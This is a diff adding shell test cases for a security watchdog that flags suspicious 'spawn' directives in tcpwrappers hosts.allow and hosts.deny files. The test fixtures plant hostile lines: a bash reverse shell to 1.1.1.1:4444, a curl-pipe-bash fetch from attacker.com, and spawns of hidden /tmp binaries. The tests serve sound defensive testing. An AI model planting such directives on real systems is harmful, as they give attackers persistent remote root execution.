@@ -198,3 +198,48 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-hosts-allow -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): hosts-allow-watchdog does NOT refresh baseline on suspicious-spawn detection — alert STAYS until operator updates" {
+    # T1546 remote-trigger root-exec persistence — alert MUST persist
+    # across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf 'ALL: ALL: spawn bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HALLOW}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"hosts_allow_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented suspicious spawn NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'sshd: 192.168.1.0/255.255.255.0\nALL: LOCAL\n# ALL: ALL: spawn /tmp/.example-attacker\n' > "${HALLOW}"
+    run_wd
+    ! cap | grep -q '"event":"hosts_allow_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-file scan: hosts.allow + hosts.deny axes — suspicious spawn in either → alert)" {
+    HDENY="${TMP}/hosts.deny"
+    seed_benign
+    FILES_V="${HALLOW} ${HDENY}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant spawn in hosts.deny — tcpwrappers honors spawn from both
+    # hosts.allow AND hosts.deny.
+    printf 'ALL: ALL: spawn /tmp/.evil %%h\n' > "${HDENY}"
+    FILES_V="${HALLOW} ${HDENY}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'ALL: ALL: spawn curl -s http://attacker.com/p | bash\n' > "${HALLOW}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
